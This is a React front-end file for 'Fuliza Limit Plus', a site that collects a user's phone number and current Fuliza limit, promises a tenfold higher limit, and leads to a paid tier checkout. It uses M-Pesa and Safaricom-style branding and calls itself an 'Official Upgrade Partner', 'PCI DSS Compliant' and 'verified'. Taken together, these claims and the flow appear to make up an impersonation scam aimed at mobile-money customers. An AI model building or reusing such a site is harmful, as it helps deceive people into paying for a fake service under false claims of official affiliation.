
import React, { useState, useCallback, useMemo } from 'react';
import Landing from './components/Landing';
import LimitInput from './components/LimitInput';
import Dashboard from './components/Dashboard';
import Checkout from './components/Checkout';
import Success from './components/Success';
import { AppStep, Tier, UserData } from './types';

const App: React.FC = () => {
  const [step, setStep] = useState<AppStep>('landing');
  const [userData, setUserData] = useState<Partial<UserData>>({});
  const [selectedTier, setSelectedTier] = useState<Tier | null>(null);

  const steps: AppStep[] = ['landing', 'limitInput', 'dashboard', 'checkout', 'success'];
  const currentStepIndex = steps.indexOf(step);

  const handlePhoneSubmit = useCallback((phoneNumber: string) => {
    setUserData(prev => ({ ...prev, phoneNumber }));
    setStep('limitInput');
  }, []);

  const handleLimitSubmit = useCallback((currentLimit: number) => {
    setUserData(prev => ({
      ...prev,
      currentLimit,
      potentialLimit: Math.min(currentLimit * 10, 50000)
    }));
    setStep('dashboard');
  }, []);

  const handleSelectTier = useCallback((tier: Tier) => {
    setSelectedTier(tier);
    setStep('checkout');
  }, []);

  const handlePaymentSuccess = useCallback(() => {
    setStep('success');
  }, []);

  const handleReset = useCallback(() => {
    setStep('landing');
    setUserData({});
    setSelectedTier(null);
  }, []);

  return (
    <div className="min-h-screen flex flex-col relative z-10">
      <header className="bg-white/80 backdrop-blur-md border-b border-gray-100 px-4 py-4 sticky top-0 z-50">
        <div className="max-w-lg mx-auto flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 bg-safaricom-green rounded-xl flex items-center justify-center shadow-lg shadow-green-200">
              <span className="text-white font-extrabold text-lg">F</span>
            </div>
            <div>
              <h1 className="font-extrabold text-gray-900 tracking-tight text-lg">Fuliza <span className="safaricom-green">Limit Plus</span></h1>
              <p className="text-[10px] text-gray-400 font-bold uppercase tracking-widest">Official Upgrade Partner</p>
            </div>
          </div>
          {step !== 'landing' && step !== 'success' && (
            <button 
              onClick={handleReset}
              className="text-xs font-bold text-gray-400 hover:text-red-500 transition-colors uppercase tracking-widest bg-gray-50 px-3 py-2 rounded-lg"
            >
              Exit
            </button>
          )}
        </div>
        
        {/* Progress Indicator */}
        {step !== 'success' && (
           <div className="max-w-lg mx-auto mt-4 h-1 bg-gray-100 rounded-full overflow-hidden">
             <div 
               className="h-full bg-safaricom-green transition-all duration-700 ease-out" 
               style={{ width: `${((currentStepIndex + 1) / steps.length) * 100}%` }}
             ></div>
           </div>
        )}
      </header>

      <main className="flex-1 flex flex-col max-w-lg mx-auto w-full px-4 py-8">
        {step === 'landing' && <Landing onCheck={handlePhoneSubmit} />}
        {step === 'limitInput' && <LimitInput onSubmit={handleLimitSubmit} />}
        {step === 'dashboard' && userData.phoneNumber && userData.currentLimit !== undefined && (
          <Dashboard 
            userData={userData as UserData} 
            onSelectTier={handleSelectTier} 
          />
        )}
        {step === 'checkout' && selectedTier && userData.phoneNumber && (
          <Checkout 
            tier={selectedTier} 
            userData={userData as UserData}
            onSuccess={handlePaymentSuccess} 
          />
        )}
        {step === 'success' && selectedTier && (
          <Success 
            tier={selectedTier} 
            onRefresh={handleReset} 
          />
        )}
      </main>

      <footer className="bg-white border-t border-gray-100 py-8 px-4 mt-auto">
        <div className="max-w-lg mx-auto flex flex-col items-center gap-6">
          <div className="flex flex-wrap justify-center gap-8 items-center opacity-60">
             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/15/M-PESA_LOGO-01.svg/512px-M-PESA_LOGO-01.svg.png" alt="M-Pesa" className="h-5" />
             <div className="h-4 w-px bg-gray-300"></div>
             <div className="flex items-center gap-2">
                <svg className="w-5 h-5 text-blue-600" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                </svg>
                <span className="text-xs font-bold text-gray-500 uppercase tracking-tighter">PCI DSS Compliant</span>
             </div>
          </div>
          <p className="text-[10px] text-gray-400 text-center uppercase tracking-[0.2em] font-medium px-4">
            &copy; 2025 Fuliza Limit Plus. A verified financial service. Terms & Conditions apply.
          </p>
        </div>
      </footer>
    </div>
  );
};

export default App;
